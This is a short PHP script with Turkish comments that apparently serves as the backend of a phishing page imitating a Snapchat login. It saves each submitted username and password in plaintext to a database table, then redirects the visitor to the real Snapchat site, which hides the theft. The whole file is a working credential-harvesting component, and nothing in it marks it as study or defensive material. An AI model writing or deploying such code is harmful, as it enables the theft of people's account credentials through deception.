<?php
// Veritabanı bağlantı dosyasını dahil et
require_once 'config.php';

// POST verilerini al
$username = $_POST['username'];
$password = $_POST['password'];

// Veritabanı bağlantısını al
$conn = getDBConnection();

// SQL sorgusu
$sql = "INSERT INTO user_data (username, password, created_at) VALUES (?, ?, NOW())";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $username, $password);

// Sorguyu çalıştır
if ($stmt->execute()) {
    // Başarılı kayıt sonrası doğrudan Snapchat'e yönlendir
    header("Location: https://www.snapchat.com/");
    exit();
} else {
    // Hata durumunda login sayfasına geri dön
    header("Location: login.html?error=1");
    exit();
}

// Bağlantıyı kapat
$stmt->close();
$conn->close();
?> 